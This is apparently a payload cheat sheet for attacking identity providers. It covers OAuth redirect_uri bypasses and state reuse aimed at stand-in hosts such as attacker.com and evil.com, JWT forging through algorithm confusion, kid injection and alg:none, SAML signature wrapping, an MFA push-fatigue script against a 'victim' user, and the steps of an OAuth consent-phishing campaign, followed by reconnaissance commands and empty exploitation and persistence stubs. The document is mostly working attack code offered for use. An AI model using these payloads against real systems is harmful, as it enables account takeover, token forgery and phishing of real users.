# Payloads — identity-provider-attack

> Attack payloads for identity-provider-attack.

## OAuth Flow Attacks

### State Parameter Reuse

```
GET /authorize?response_type=code&client_id=APP_ID&redirect_uri=https://attacker.com/callback&state=REUSED_STATE
```

### PKCE Downgrade

```python
# If PKCE is optional, omit code_challenge
auth_url = f"/authorize?response_type=code&client_id={APP_ID}&redirect_uri={CALLBACK}"
# No code_challenge parameter
```

### redirect_uri Bypass

```
Legitimate: https://app.contoso.com/callback
Bypass: https://app.contoso.com/callback/../../attacker.com
        https://app.contoso.com/callback?redirect=https://attacker.com
        https://app.contoso.com.evil.com
```

## JWT Attacks

### Algorithm Confusion (RS256 → HS256)

```python
# Step 1: Get public key from JWKS
public_key = get_jwks(kid)

# Step 2: Forge HS256-signed JWT using public key as HMAC secret
import jwt
forged = jwt.encode({"sub":"admin","role":"admin"}, public_key, algorithm="HS256", headers={"kid":kid})
```

### kid Header Injection

```
Header: {"alg":"HS256","kid":"../../dev/null"}
# Some implementations read key from file path; /dev/null is empty string
```

### null signature

```
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
# Some libraries accept "alg: none" and skip signature verification
```

## SAML Attacks

### XML Signature Wrapping

```xml
<Response>
  <Assertion ID="legitimate">...</Assertion>  <!-- Signed -->
  <Assertion ID="attacker">  <!-- Unsigned but processed -->
    <Subject>attacker@evil.com</Subject>
  </Assertion>
</Response>
```

## MFA Fatigue Script

```python
import requests
for _ in range(50):
    requests.post("https://login.contoso.com/mfa/challenge", json={"user":"victim"})
    # User gets 50 push notifications; may approve to silence
```

## OAuth Consent Phishing

```
Register OAuth app "Contoso Security Scanner" with mail.read scope.
Send phishing: "Click here to run security scan" → consent flow.
Attacker now has persistent mail.read access.
```


---

## Additional Payloads

### Reconnaissance

```bash
# Fingerprint target
nmap -sV target.com
whatweb target.com
```

### Exploitation

```bash
# Various exploitation payloads
# (See kali-claw for full library)
```

### Persistence

```bash
# Persistence techniques
# (Depends on specific target)
```
